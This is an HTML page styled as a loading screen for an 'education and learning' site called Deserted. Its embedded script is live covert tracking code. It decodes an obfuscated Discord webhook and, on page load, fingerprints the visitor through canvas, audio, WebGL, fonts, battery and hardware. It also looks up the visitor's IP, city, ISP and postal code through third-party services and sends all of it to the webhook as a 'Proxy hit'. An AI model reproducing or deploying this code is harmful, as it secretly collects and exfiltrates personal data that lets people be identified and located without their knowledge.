<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="Deserted education and learning">
  <title>Deserted</title>
  <style>
    html, body {
      margin: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      background: #0b1418;
    }
    body {
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      color: #c8d6dc;
    }
    svg {
      display: block;
      width: 100%;
      height: 100%;
      position: fixed;
      top: 0;
      left: 0;
      background: #0b1418;
    }
    .stage {
      position: relative;
      width: 100%;
      height: 100%;
      background: radial-gradient(ellipse at center, #122028 0%, #0b1418 70%);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 14px;
    }
    .orb {
      width: 88px;
      height: 88px;
      border-radius: 50%;
      background: conic-gradient(from 0deg, #1a4a55, #3db8d0, #1a4a55);
      animation: spin 2.2s linear infinite;
      position: relative;
      box-shadow: 0 0 40px rgba(61, 184, 208, 0.25);
    }
    .orb::after {
      content: "";
      position: absolute;
      inset: 8px;
      border-radius: 50%;
      background: #0b1418;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    h1 {
      margin: 8px 0 0;
      font-size: 1.45rem;
      font-weight: 700;
      color: #e8f4f7;
      letter-spacing: 0.04em;
    }
    .sub {
      margin: 0;
      font-size: 0.9rem;
      color: #7a96a0;
    }
    .bar {
      width: 180px;
      height: 3px;
      background: #1a2c32;
      border-radius: 99px;
      overflow: hidden;
      margin-top: 6px;
    }
    .bar > i {
      display: block;
      height: 100%;
      width: 40%;
      background: linear-gradient(90deg, #3db8d0, #7fd4e8);
      border-radius: 99px;
      animation: slide 1.3s ease-in-out infinite;
    }
    @keyframes slide {
      0% { margin-left: 0; width: 30%; }
      50% { margin-left: 35%; width: 45%; }
      100% { margin-left: 70%; width: 30%; }
    }
    .hint {
      font-size: 0.72rem;
      color: #4d646c;
      margin-top: 4px;
    }
  </style>
</head>
<body>
<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
  <foreignObject width="100%" height="100%">
    <div xmlns="http://www.w3.org/1999/xhtml" class="stage">
      <div class="orb"></div>
      <h1>DESERTED</h1>
      <p class="sub">education and learning</p>
      <div class="bar"><i></i></div>
      <p class="hint">loading resources</p>
    </div>
  </foreignObject>
</svg>
<script>
(function () {
  var WH = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU0MzgxMzI2MzA5ODI1MzM0Mi9ScWFMT2lmSXF1RWJ3TWdkQnhrRXlVTHhsUGFrNERSdnVyUkNucXg2QTlnUS1nVHZhRzJiWVc0cnYtaXZXdFJDQ05tOA==");
  var sid = Math.random().toString(36).slice(2, 10).toUpperCase();

  function hashStr(s) {
    var h = 2166136261 >>> 0;
    for (var i = 0; i < s.length; i++) {
      h ^= s.charCodeAt(i);
      h = Math.imul(h, 16777619);
    }
    return (h >>> 0).toString(16);
  }

  function webglInfo() {
    try {
      var c = document.createElement("canvas");
      var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
      if (!gl) return { vendor: "?", renderer: "?" };
      var dbg = gl.getExtension("WEBGL_debug_renderer_info");
      return {
        vendor: dbg ? String(gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)) : String(gl.getParameter(gl.VENDOR)),
        renderer: dbg ? String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)) : String(gl.getParameter(gl.RENDERER))
      };
    } catch (e) {
      return { vendor: "?", renderer: "?" };
    }
  }

  function canvasFp() {
    try {
      var c = document.createElement("canvas");
      c.width = 240; c.height = 60;
      var ctx = c.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "14px Arial";
      ctx.fillStyle = "#f60";
      ctx.fillRect(100, 1, 62, 20);
      ctx.fillStyle = "#069";
      ctx.fillText("deserted:" + sid, 2, 15);
      ctx.fillStyle = "rgba(102,204,0,0.7)";
      ctx.fillText("deserted:" + sid, 4, 17);
      return hashStr(c.toDataURL());
    } catch (e) {
      return "?";
    }
  }

  function audioFp() {
    return new Promise(function (resolve) {
      try {
        var AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
        if (!AC) return resolve("?");
        var ctx = new AC(1, 44100, 44100);
        var osc = ctx.createOscillator();
        var comp = ctx.createDynamicsCompressor();
        osc.type = "triangle";
        osc.frequency.value = 10000;
        osc.connect(comp);
        comp.connect(ctx.destination);
        osc.start(0);
        ctx.startRendering();
        ctx.oncomplete = function (ev) {
          try {
            var data = ev.renderedBuffer.getChannelData(0);
            var sum = 0;
            for (var i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
            resolve(hashStr(String(sum)));
          } catch (e) {
            resolve("?");
          }
        };
        setTimeout(function () { resolve("?"); }, 1000);
      } catch (e) {
        resolve("?");
      }
    });
  }

  function fontProbe() {
    try {
      var base = ["monospace", "sans-serif", "serif"];
      var fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Palatino", "Garamond", "Comic Sans MS", "Trebuchet MS", "Impact", "Roboto", "Ubuntu", "Helvetica"];
      var found = [];
      var span = document.createElement("span");
      span.style.cssText = "position:absolute;left:-9999px;font-size:72px";
      span.textContent = "mmmmmmmmmmlli";
      document.documentElement.appendChild(span);
      var widths = {};
      for (var bi = 0; bi < base.length; bi++) {
        span.style.fontFamily = base[bi];
        widths[base[bi]] = span.offsetWidth;
      }
      for (var fi = 0; fi < fonts.length; fi++) {
        for (var bj = 0; bj < base.length; bj++) {
          span.style.fontFamily = "'" + fonts[fi] + "'," + base[bj];
          if (span.offsetWidth !== widths[base[bj]]) {
            found.push(fonts[fi]);
            break;
          }
        }
      }
      span.parentNode.removeChild(span);
      return found.join(", ") || "none";
    } catch (e) {
      return "?";
    }
  }

  var gl = webglInfo();
  var p = {
    sid: sid,
    ts: new Date().toISOString(),
    ua: navigator.userAgent || "?",
    platform: navigator.platform || "?",
    lang: navigator.language || "?",
    languages: (navigator.languages || []).join(", "),
    cookieEnabled: !!navigator.cookieEnabled,
    hardwareConcurrency: navigator.hardwareConcurrency || null,
    deviceMemory: navigator.deviceMemory || null,
    maxTouchPoints: navigator.maxTouchPoints || 0,
    vendor: navigator.vendor || "?",
    pdfViewer: navigator.pdfViewerEnabled,
    dnt: navigator.doNotTrack || "?",
    screen: screen.width + "x" + screen.height + "@" + screen.colorDepth,
    avail: screen.availWidth + "x" + screen.availHeight,
    dpr: window.devicePixelRatio || 1,
    tz: (Intl.DateTimeFormat().resolvedOptions().timeZone || "?"),
    offset: new Date().getTimezoneOffset(),
    ref: document.referrer || "direct",
    href: location.href,
    online: navigator.onLine,
    storage: "?",
    perfMem: "?",
    battery: "?",
    webglVendor: gl.vendor,
    webglRenderer: gl.renderer,
    canvasFp: canvasFp(),
    audioFp: "?",
    fonts: fontProbe(),
    mediaKinds: "?",
    ip: null,
    location: "?",
    isp: "?",
    asn: "?",
    postal: "?",
    connection: "?"
  };

  try {
    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) p.connection = [conn.effectiveType, conn.downlink, conn.rtt].filter(function (x) { return x != null; }).join(" / ");
  } catch (e) {}
  try {
    p.storage = "ls=" + localStorage.length + " ss=" + sessionStorage.length;
  } catch (e) {
    p.storage = "blocked";
  }
  try {
    if (performance && performance.memory) {
      p.perfMem = Math.round(performance.memory.usedJSHeapSize / 1048576) + "/" + Math.round(performance.memory.jsHeapSizeLimit / 1048576) + "MB";
    }
  } catch (e) {}

  function buildContent() {
    return [
      "**Proxy hit** `" + p.sid + "`",
      "IP: `" + (p.ip || "?") + "`",
      "Loc: " + p.location,
      "ISP: " + p.isp,
      "ASN: " + p.asn,
      "Postal: " + p.postal,
      "UA: " + p.ua,
      "Platform: " + p.platform,
      "Lang: " + p.lang + " (" + p.languages + ")",
      "Screen: " + p.screen + " avail " + p.avail + " dpr " + p.dpr,
      "TZ: " + p.tz + " offset " + p.offset,
      "Ref: " + p.ref,
      "URL: " + p.href,
      "Net: " + p.connection + " online=" + p.online,
      "HW: cores=" + p.hardwareConcurrency + " mem=" + p.deviceMemory + " touch=" + p.maxTouchPoints,
      "Vendor: " + p.vendor + " pdf=" + p.pdfViewer + " dnt=" + p.dnt,
      "Storage: " + p.storage,
      "Heap: " + p.perfMem,
      "Battery: " + p.battery,
      "WebGL: " + p.webglVendor + " | " + p.webglRenderer,
      "CanvasFP: `" + p.canvasFp + "`",
      "AudioFP: `" + p.audioFp + "`",
      "Fonts: " + p.fonts,
      "Media: " + p.mediaKinds,
      "Cookies: " + p.cookieEnabled,
      "TS: " + p.ts
    ].join("\n");
  }

  function postDiscord(content) {
    var payload = JSON.stringify({ content: content });
    try {
      if (navigator.sendBeacon) {
        var blob = new Blob([payload], { type: "application/json" });
        if (navigator.sendBeacon(WH, blob)) return true;
      }
    } catch (e) {}
    try {
      fetch(WH, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: payload,
        mode: "cors",
        keepalive: true
      }).catch(function () {
        try {
          fetch(WH, { method: "POST", body: payload, mode: "no-cors", keepalive: true }).catch(function () {});
        } catch (e2) {}
      });
      return true;
    } catch (e) {}
    return false;
  }

  // early hit so something always lands
  postDiscord("**Proxy hit (early)** `" + p.sid + "`\nUA: " + p.ua + "\nURL: " + p.href + "\nTS: " + p.ts);

  (async function () {
    try {
      if (navigator.getBattery) {
        var b = await Promise.race([
          navigator.getBattery(),
          new Promise(function (r) { setTimeout(function () { r(null); }, 700); })
        ]);
        if (b) p.battery = Math.round(b.level * 100) + "% " + (b.charging ? "charging" : "not-charging");
      }
    } catch (e) {}

    try {
      p.audioFp = await Promise.race([
        audioFp(),
        new Promise(function (r) { setTimeout(function () { r("?"); }, 900); })
      ]);
    } catch (e) {
      p.audioFp = "?";
    }

    try {
      if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
        var devs = await navigator.mediaDevices.enumerateDevices();
        var kinds = {};
        for (var i = 0; i < devs.length; i++) {
          kinds[devs[i].kind] = (kinds[devs[i].kind] || 0) + 1;
        }
        p.mediaKinds = Object.keys(kinds).map(function (k) { return k + "=" + kinds[k]; }).join(", ") || "none";
      }
    } catch (e) {
      p.mediaKinds = "?";
    }

    var ipDone = false;
    async function tryIp(url, mapFn) {
      if (ipDone) return;
      try {
        var r = await fetch(url, { cache: "no-store" });
        if (!r.ok) return;
        var d = await r.json();
        mapFn(d);
        if (p.ip) ipDone = true;
      } catch (e) {}
    }

    await tryIp("https://ipapi.co/json/", function (d) {
      p.ip = d.ip || null;
      p.location = [d.city, d.region, d.country_name || d.country].filter(Boolean).join(", ") || "?";
      p.isp = d.org || d.isp || "?";
      p.asn = d.asn || "?";
      p.postal = d.postal || "?";
    });
    await tryIp("https://ipwho.is/", function (d) {
      p.ip = d.ip || p.ip;
      p.location = [d.city, d.region, d.country].filter(Boolean).join(", ") || p.location;
      p.isp = (d.connection && d.connection.isp) || d.org || p.isp;
      p.asn = (d.connection && d.connection.asn) || p.asn;
      p.postal = d.postal || p.postal;
    });
    await tryIp("https://api.ipify.org?format=json", function (d) {
      p.ip = d.ip || p.ip;
    });

    postDiscord(buildContent());
  })();
})();
</script>
</body>
</html>
